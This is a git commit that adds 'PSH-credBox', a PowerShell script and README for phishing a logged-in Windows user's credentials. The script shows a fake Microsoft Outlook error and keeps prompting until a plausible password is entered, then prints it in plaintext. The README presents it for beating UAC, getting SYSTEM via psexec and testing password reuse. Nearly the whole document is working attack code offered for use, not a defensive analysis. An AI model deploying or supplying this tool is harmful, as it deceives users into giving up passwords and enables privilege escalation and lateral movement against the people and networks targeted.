6b7e04f6a7a0fb25cd93927e5c5b0e1c9c4b772b
Rasta Mouse <rasta@rastamouse.me>
2016-11-29 17:40:32 +0000

    First commit

--- README.md
+++ README.md
@@ -1,2 +1,13 @@
 # PSH-credBox
-PowerShell to pop an error message and prompt for credentials
+PowerShell to pop an error message and prompt for credentials.  I found this useful where a user was a local admin, but UAC was set to 'always notify'.  With the password you can do something like psexec to get SYSTEM or check for password re-use elsewhere.
+
+## "Features"
+* Wrapped into a function, so it can be loaded into memory and invoked at will.
+* Automatically grabs environment domain and username.
+* Loops infinitely if user clicks 'cancel' or 'x'.
+* Some vague attempt at verifying whether the password entered is likely to be legit (currently based on length).
+
+## Todo
+* Add proper PowerShell .SYNOPSIS and nice things like that.
+* Add a password complexity check, to reject a random 'lskfhklsdjf' keyboard mash.  Maybe something that actually validates the creds?
+* Make the output prettier.
---
+++ credBox.ps1
@@ -0,0 +1,33 @@
+﻿function Invoke-CredBox() {
+
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+
+[System.Windows.Forms.MessageBox]::Show("Outlook cannot log on.  Verify you are connected to the network and are using the proper server and mailbox name. The Microsoft Exchange information service in your profile is missing required information. Modify your profile to ensure that you are using the correct Microsoft Exchange information service.","Microsoft Outlook",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
+
+while ($true) {
+
+    $credential = $host.ui.PromptForCredential("Credentials Required", "Please enter your user name and password.", "$env:userdomain\$env:username", "NetBiosUserName")
+
+    if ($credential) {
+
+        $clear = $credential.Password | ConvertFrom-SecureString
+        $password = $credential.GetNetworkCredential().password
+
+        if ($password.Length -gt 7) {
+
+
+            echo ""
+            $env:username
+            $password
+            echo ""
+
+            break
+
+            }
+
+        }
+
+    }
+
+}
